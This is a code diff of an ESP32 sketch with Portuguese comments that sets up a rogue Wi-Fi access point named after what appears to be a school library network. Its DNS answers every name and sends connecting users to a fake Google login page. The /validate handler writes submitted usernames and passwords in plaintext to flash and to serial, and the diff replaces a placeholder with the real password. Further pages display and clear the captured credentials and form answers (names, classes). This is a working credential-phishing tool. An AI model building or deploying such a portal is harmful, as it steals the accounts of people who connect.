@@ -5,6 +5,7 @@
 #include <DNSServer.h>
 #include <ESPmDNS.h>
 #include <FS.h>
+
 #include "google.h"
 #include "facebook.h"
 #include "instagram.h"
@@ -12,190 +13,268 @@
 #include "final.h"
 
 #define LOGFILE "/log.txt"
- 
-// Ponto de acesso
-const char *ssid="SENAI-FHZ-BIBLIOTECA";
+#define RESPOSTASFILE "/respostas.txt"
 
-// Login da pagina de captura
+// Ponto de acesso
+const char *ssid = "SENAI-FHZ-BIBLIOTECA";
+
+// Páginas HTML
 #define captivePortalPage GOOGLE_HTML
 #define erroPage FAKE_FORM_HTML
 #define finalPage FAKE_FORM_RESULT_HTML
-// INSTAGRAM_HTML, GOOGLE_HTML, FACEBOOK_HTML
 
-// Configuração básica usando configurações de rede comuns (porta DNS usual, IP e porta do servidor web)
+// Rede
 const byte DNS_PORT = 53;
 IPAddress apIP(200, 200, 200, 1);
 IPAddress netMsk(255, 255, 255, 0);
 DNSServer dnsServer;
 WebServer server(80);
 
-// Strings de buffer
-String webString="";
-String serialString="";
+// Buffers
+String webString = "";
+String serialString = "";
 
-// Pisca o LED integrado numero de vezes
-void blink(int n)
-{
-  for(int i = 0; i < n; i++)
-  {
-    digitalWrite(15, LOW);    
-    delay(250);                    
-    digitalWrite(15, HIGH);  
+// Pisca o LED
+void blink(int n) {
+  for (int i = 0; i < n; i++) {
+    digitalWrite(15, LOW);
+    delay(250);
+    digitalWrite(15, HIGH);
     delay(250);
   }
 }
 
+// Página principal
 void handleRoot() {
   server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
   server.sendHeader("Pragma", "no-cache");
   server.sendHeader("Expires", "-1");
-
   server.send(200, "text/html", captivePortalPage);
 }
 
 void setup() {
-  // Iniciar comunicação serial
   Serial.begin(9600);
-  Serial.println();
   Serial.println("ESP32captive(1.5)");
-  Serial.println();
 
-  // configuração de LED
   pinMode(15, OUTPUT);
-  digitalWrite(15, HIGH);  
+  digitalWrite(15, HIGH);
 
-  // Inicialize o sistema de arquivos (SPIFFS) e leia o arquivo de log, se não estiver presente, crie um novo
-  Serial.print("Inicializando o sistema de arquivos (a primeira vez pode levar cerca de 90 segundos)...");
-  SPIFFS.begin();
-  Serial.println("Sucesso!");
-  Serial.print("Verificando o arquivo log.txt...");
-  
-  // isso abre o arquivo "log.txt" em modo de leitura
-  File f = SPIFFS.open(LOGFILE, "r");
-  
-  if (!f) {
-    Serial.print("O arquivo ainda não existe.\n Formatando e criando...");
-    SPIFFS.format();
-    // abre o arquivo no modo de escrita
-    File f = SPIFFS.open(LOGFILE, "w");
-    if (!f) {
-      Serial.println("Falha na criação do arquivo!");
-    }
-    f.println("Credenciais de login capturadas:");
+  // Inicializar SPIFFS
+  Serial.print("Inicializando SPIFFS...");
+  if (!SPIFFS.begin()) {
+    Serial.println("Falha ao montar SPIFFS.");
+    return;
   }
-  f.close();
-  Serial.println(" Sucesso!");
+  Serial.println("Sucesso!");
 
-  // Criar Ponto de Acesso
-  Serial.print("Criando Ponto de Acesso...");
+  // Verifica e cria arquivos de log e respostas
+  if (!SPIFFS.exists(LOGFILE)) {
+    File f = SPIFFS.open(LOGFILE, "w");
+    if (f) {
+      f.println("Credenciais de login capturadas:");
+      f.close();
+    }
+  }
+
+  if (!SPIFFS.exists(RESPOSTASFILE)) {
+    File f = SPIFFS.open(RESPOSTASFILE, "w");
+    if (f) {
+      f.println("Respostas do formulário:");
+      f.close();
+    }
+  }
+
+  // Criar AP
+  Serial.print("Criando AP...");
   WiFi.mode(WIFI_AP);
-  delay(2000);
+  delay(1000);
   WiFi.softAPConfig(apIP, apIP, netMsk);
   WiFi.softAP(ssid);
-  delay(500);
-  Serial.println(" Sucesso!");
+  Serial.println(" OK");
 
-  // Inicie o servidor DNS
-  Serial.print("Iniciando Servidor DNS...");
+  // DNS
   dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
   dnsServer.start(DNS_PORT, "*", apIP);
-  Serial.println(" Sucesso!");
 
-  // Verifique o nome do domínio e atualize a página
+  // Roteamento principal
   server.on("/", handleRoot);
-  server.on("/generate_204", handleRoot);  // Portal cativo Android. Talvez não seja necessário. Pode ser manipulado pelo manipulador notFound.
-  server.on("/fwlink", handleRoot); // Portal cativo da Microsoft. Talvez não seja necessário. Pode ser manipulado pelo manipulador notFound.
+  server.on("/generate_204", handleRoot);
+  server.on("/fwlink", handleRoot);
   server.onNotFound(handleRoot);
 
-  // Valide e salve as combinações USUARIO / SENHA
+  // Valida e salva login
   server.on("/validate", []() {
-    // armazenar credenciais colhidas
-    String url = server.arg("url");
     String user = server.arg("user");
     String pass = server.arg("pass");
 
-    // Enviando dados para Serial (DEBUG
-    serialString = user+":"+" SUA SENHA AQUI ";
+    serialString = user + ":" + pass;
     Serial.println(serialString);
 
-    // Anexar dados ao arquivo de log
     File f = SPIFFS.open(LOGFILE, "a");
-    f.print(url);
-    f.print(":");
-    f.print(user);
-    f.print(":");
-    f.println(" SUA SENHA AQUI ");
-    f.close();
-    
-    // Envie uma resposta de erro ao usuário após a coleta de credencial
+    if (f) {
+      f.print("Login: ");
+      f.print(user);
+      f.print(" | Senha: ");
+      f.println(pass);
+      f.close();
+    }
+
     server.send(500, "text/html", erroPage);
-
-    // Reinicializar strings de buffer
-    serialString="";
-    webString="";
-
     blink(2);
-    
   });
 
+  // Captura respostas do formulário
+  server.on("/final", []() {
+    String pergunta1 = server.arg("pergunta1");
+    String pergunta2 = server.arg("pergunta2");
+    String pergunta3 = server.arg("pergunta3");
+    String pergunta4 = server.arg("pergunta4");
+    String pergunta5 = server.arg("pergunta5");
+    String pergunta6 = server.arg("pergunta6");
+    String resposta_aberta = server.arg("resposta_aberta");
+    String nome = server.arg("nome");
+    String turma = server.arg("turma");
 
+    File f = SPIFFS.open(RESPOSTASFILE, "a");
+    if (f) {
+      f.println("Resposta recebida:");
+      f.println("Pergunta 1: " + pergunta1);
+      f.println("Pergunta 2: " + pergunta2);
+      f.println("Pergunta 3: " + pergunta3);
+      f.println("Pergunta 4: " + pergunta4);
+      f.println("Pergunta 5: " + pergunta5);
+      f.println("Pergunta 6: " + pergunta6);
+      f.println("Resposta aberta: " + resposta_aberta);
+      f.println("Nome: " + nome);
+      f.println("Turma: " + turma);
+      f.println("-------------------------");
+      f.close();
+    }
 
-
-
-
-  //Teste
-    server.on("/final", []() {
-    
-    // Envie uma resposta de erro ao usuário após a coleta de credencial
     server.send(200, "text/html", finalPage);
+    blink(2);
   });
-  //Teste
 
-
-
-
-
-  
-
-  // Logging Page
-  server.on("/logs", [](){
-    webString="<html><body><h1>Captured Logs</h1><br><pre>";
+  // Página de logs -OLD VERSION
+/*  server.on("/logs", []() {
+    webString = "<html><body><h1>Logs de Login</h1><pre>";
     File f = SPIFFS.open(LOGFILE, "r");
-    serialString = f.readString();
-    webString += serialString;
-    f.close();
-    webString += "</pre><br><a href='/logs/clear'>Clear all logs</a></body></html>";
+    if (f) {
+      serialString = f.readString();
+      webString += serialString;
+      f.close();
+    } else {
+      webString += "Nenhum log encontrado.";
+    }
+    webString += "</pre></body></html>";
     server.send(200, "text/html", webString);
-    Serial.println(serialString);
-    serialString="";
-    webString="";
+  });
+*/
+
+
+  // Página de logs
+  server.on("/logs", []() {
+    webString = "<html><body>";
+    webString += "<h1>Logs de Login</h1><pre>";
+
+    File f = SPIFFS.open(LOGFILE, "r");
+    if (f) {
+      serialString = f.readString();
+      webString += serialString;
+      f.close();
+    } else {
+      webString += "Nenhum log encontrado.";
+    }
+    webString += "</pre>";
+
+    // Botão para limpar os logs
+    webString += "<form action='/logs/clear' method='GET'>";
+    webString += "<button type='submit'>Limpar Logs</button>";
+    webString += "</form>";
+
+    webString += "</body></html>";
+    server.send(200, "text/html", webString);
   });
 
-  // Limpar todos os logs
-  server.on("/logs/clear", [](){
-    webString="<html><body><h1>All logs cleared</h1><br><a href=\"/esportal\"><- BACK TO INDEX</a></body></html>";
+
+
+  // Página de respostas - OLD VERSION
+/*  server.on("/respostas", []() {
+    webString = "<html><body><h1>Respostas do Formulário</h1><pre>";
+    File f = SPIFFS.open(RESPOSTASFILE, "r");
+    if (f) {
+      serialString = f.readString();
+      webString += serialString;
+      f.close();
+    } else {
+      webString += "Nenhuma resposta encontrada.";
+    }
+    webString += "</pre></body></html>";
+    server.send(200, "text/html", webString);
+  });
+*/
+
+
+  // Página de respostas
+  server.on("/respostas", []() {
+    webString = "<html><body>";
+    webString += "<h1>Respostas do Formulário</h1><pre>";
+
+    File f = SPIFFS.open(RESPOSTASFILE, "r");
+    if (f) {
+      serialString = f.readString();
+      webString += serialString;
+      f.close();
+    } else {
+      webString += "Nenhuma resposta encontrada.";
+    }
+    webString += "</pre>";
+
+    // Botão para limpar as respostas
+    webString += "<form action='/respostas/clear' method='GET'>";
+    webString += "<button type='submit'>Limpar Respostas</button>";
+    webString += "</form>";
+
+    webString += "</body></html>";
+    server.send(200, "text/html", webString);
+  });
+
+
+
+  // Limpa logs
+  server.on("/logs/clear", []() {
     File f = SPIFFS.open(LOGFILE, "w");
     f.println("Credenciais de login capturadas:");
     f.close();
-    server.send(200, "text/html", webString);
-    Serial.println(serialString);
-    serialString="";
-    webString="";
+    server.send(200, "text/html", "<html><body><h1>Logs limpos</h1></body></html>");
   });
-  
-  // Inicie o servidor da Web
-  Serial.print("Iniciando o Servidor da Web...");
+
+  // Limpa logs
+  server.on("/logs/clear", []() {
+    File f = SPIFFS.open(LOGFILE, "w");
+    f.println("Credenciais de login capturadas:");
+    f.close();
+    server.send(200, "text/html", "<html><body><h1>Logs limpos</h1></body></html>");
+  });
+
+
+  // Limpa respostas
+  server.on("/respostas/clear", []() {
+    File f = SPIFFS.open(RESPOSTASFILE, "w");
+    f.println("Respostas do formulário:");
+    f.close();
+    server.send(200, "text/html", "<html><body><h1>Respostas limpas</h1></body></html>");
+  });
+
+
+
+  // Inicia o servidor
   server.begin();
-  Serial.println(" Sucesso!");
-  
+  Serial.println("Servidor iniciado!");
   blink(1);
-  
-  Serial.println("Dispositivo pronto!");
 }
 
 void loop() {
   dnsServer.processNextRequest();
   server.handleClient();
 }
-
-
